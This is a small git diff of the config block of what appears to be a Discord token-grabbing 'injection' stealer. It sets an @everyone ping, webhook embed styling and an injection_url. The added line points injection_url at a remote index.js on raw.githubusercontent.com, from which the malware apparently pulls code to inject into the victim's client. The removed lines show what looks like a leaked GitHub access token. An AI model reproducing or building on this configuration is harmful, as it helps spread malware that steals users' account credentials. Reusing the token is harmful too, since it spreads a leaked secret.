@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'VOVOCHKA', 
-  embed_icon: 'https://raw.githubusercontent.com/Glinomec1488/custom-inj/main/1.jpg?token=GHSAT0AAAAAACJDYQ65PCROUGOGTYUVBQ72ZLJA2GQ'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/Glinomec1488/custom-inj/main/1.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Glinomec1488/custom-inj/main/1.jpg?token=GHSAT0AAAAAACJDYQ65PCROUGOGTYUVBQ72ZLJA2GQ', 
+  injection_url: 'https://raw.githubusercontent.com/Glinomec1488/custom-inj/main/index.js', 
   /**
    
    **/
